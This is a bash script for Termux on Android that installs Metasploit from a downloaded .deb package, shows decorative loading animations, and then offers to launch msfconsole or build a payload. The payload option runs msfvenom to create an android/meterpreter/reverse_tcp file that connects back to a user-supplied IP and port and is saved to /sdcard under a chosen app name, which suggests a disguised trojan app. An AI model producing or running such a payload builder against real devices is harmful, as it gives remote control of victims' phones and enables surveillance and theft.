#!/bin/bash
pkg install figlet
clear
echo -e "\e[1;40;32m"
figlet metasploit
echo -e "\e[1;40;33m one click metasploit installer \e[0m"
echo -e "\e[1;40;34m low end phone metasploit inataller... \e[0m"

read -p "ples ente eny key : " zzzzzzz


for (( i=0; i<5; i++ ))
   do
   echo -e "\e[1;40;32m loding. \e[0m"
   sleep 0.1
   clear
   echo -e "\e[1;40;32m loding.. \e[0m"
   sleep 0.1
   clear
   echo -e "\e[1;40;32m loding... \e[0m"
   sleep 0.1
   clear
   echo -e "\e[1;40;32m loding.... \e[0m"
   clear
   sleep 0.1
   echo -e "\e[1;40;32m loding..... \e[0m"
   clear
done

read -p "do you want install metasploit [y/n] : " mi
if [ $mi == y ]
then
    echo -e "\e[3;40;32m ples wit pkg's installing... \e[0m"
    sleep 0.7
    cd $HOME
    pkg upgrade
    pkg update
    echo -e "\e[1;40;32m ruby is inslaiing .. \e[0m"
    sleep 1
    pkg install ruby -y
    clear
    
    
    echo -e "\e[1;40;32m gem bundelr is inslaiing .. \e[0m"
    sleep 1
    gem install bundler:1.17.3
    clear
    echo -e "\e[1;40;32m curl is inslaiing .. \e[0m"
    sleep 1
    
    pkg install curl -y
    clear
    
    curl -LO https://github.com/termux/termux-packages/files/3960686/metasploit_5.0.56_android5_all.deb.gz
    
    gunzip metasploit_5.0.56_android5_all.deb.gz
    
    
    dpkg -i metasploit_5.0.56_android5_all.deb
    clear
    echo -e "\e[1;40;32m metasploit is installing starting ples wit"
    sleep 1
     clear
     echo "loding $                $"
     sleep 0.3
     clear
     echo "loding $>               $"
     sleep 0.3
     clear
     echo "loding $=>              $"
     sleep 0.3
     clear
     echo "loding $==>             $"
     sleep 0.3
     clear
     echo "loding $===>            $"
     sleep 0.3
     clear
     echo "loding $====>           $"
     sleep 0.3
     clear
     echo "loding $=====>          $"
     sleep 0.3
     clear
     echo "loding $======>         $"
     sleep 0.3
     clear
     echo "loding $=======>        $"
     sleep 0.3
     clear
     echo "loding $========>       $"
     sleep 0.3
     clear
     echo "loding $=========>      $"
     sleep 0.3
     clear
     echo "loding $==========>     $"
     sleep 0.3
     clear
     echo "loding $===========>    $"
     sleep 0.3
     clear
     echo "loding $=============>  $"
     sleep 0.3
     clear
     echo "loding $==============> $"
     sleep 0.3
     clear
     echo "loding $===============>$"
     sleep 0.3
     clear
     echo -e "\e[0m"

     pkg install -f -y
    
    
    
else
    exit
    
fi

echo -e "\e[1;40;32m metasploit instaletion complet.... \e[0m"
echo -e "\e[1m"
read -p "do you want start msfconsole [mf] or msfvenom android payload [mp] ples enter [mf]or[mp] : " payload
echo -e "\e[0m"

if [ $payload == mf ]
then
    echo -e "\e[1;40;33m msfconsole is starting  please wait...\e[0m"
    msfconsole
    
elif [ $payload == mp ]
then
    read -p "enter ip : " ip
    read -p "enter port : " port
    read -p "enter app name : " apname
    echo -e "\e[1;40;33m payload is creating  please wait...\e[0m"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> /sdcard/$apname

else
    exit
    
fi

echo -e "\e[1;40;32m tanks to use....   \e[0m"
sleep 2